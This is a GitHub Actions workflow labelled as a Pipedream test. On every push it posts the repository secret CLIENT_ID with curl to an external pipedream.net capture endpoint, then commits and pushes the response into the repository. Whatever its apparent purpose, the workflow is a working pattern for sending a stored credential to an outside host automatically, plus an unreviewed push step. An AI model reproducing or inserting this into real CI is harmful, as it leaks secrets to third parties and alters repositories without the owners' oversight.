name: 🔍 Pipedream Test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - run: |
        curl -X POST https://eo.o_zwIrG4g.m.pipedream.net \
        -H "Content-Type: application/json" \
        -d '{"client_id":"${{ secrets.CLIENT_ID }}","test":true}' > result.txt
      env:
        CLIENT_ID: ${{ secrets.CLIENT_ID }}
    - run: |
        echo "## Result" >> $GITHUB_STEP_SUMMARY
        cat result.txt >> $GITHUB_STEP_SUMMARY
        cp result.txt 📋-report.txt
        git add 📋-report.txt
        git commit -m "Test result" || true
        git push
